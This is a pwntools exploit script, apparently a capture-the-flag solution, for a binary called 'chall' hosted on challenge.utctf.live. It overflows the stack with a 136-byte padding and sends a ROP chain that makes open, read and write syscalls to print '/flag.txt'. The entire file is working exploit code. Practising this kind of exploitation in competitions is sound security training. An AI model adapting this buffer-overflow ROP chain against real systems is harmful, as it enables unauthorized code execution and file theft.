#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./chall")
rop = ROP(context.binary)
pop_rax = 0x0000000000450507
pop_rdi = 0x000000000040204f
pop_rsi = 0x000000000040a0be
pop_rdx_rbx = 0x000000000048630b
syscall = 0x000000000041ae16
wa_memory = 0x4c82b0
mov_qword_rsi_rax = 0x0000000000452d05

# libc = ELF("./libc6-x32_2.36-9_amd64.so")




def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenge.utctf.live", 5141)
        # host = "2b3e03ad9fbfd024830fa18a-1024-intro-pwn-1.challenge.cscg.live"
        # port = 1337

        # r = remote(host, port, ssl=True)

    return r

def write_flag():
    rop.rsi = wa_memory
    rop.rax = b"/flag.tx"
    rop.raw(mov_qword_rsi_rax)
    rop.rsi = wa_memory + 8
    rop.rax = b"t\x00\x00\x00\x00\x00\x00\x00"
    rop.raw(mov_qword_rsi_rax)

def read():
    rop.rax = 0
    rop.rdi = 5
    rop.rsi = wa_memory
    rop.rdx = 0xff
    rop.raw(syscall)

def open():
    rop.rax = 2
    rop.rdi = wa_memory
    rop.rsi = 0
    rop.rdx = 0
    rop.raw(syscall)

def writ():
    rop.rax = 1
    rop.rdi = 1
    rop.rsi = wa_memory
    rop.rdx = 0xff
    rop.raw(syscall)



def main():
    # good luck pwning :)
    r = conn()
    offset = 136
    rop.raw(b"A" * offset)
    write_flag()
    open()
    read()
    writ()
    r.sendline(rop.chain())
    print(r.recv(9999))
    
    

    r.interactive()
    write("payload",rop.chain())

if __name__ == "__main__":
    main()
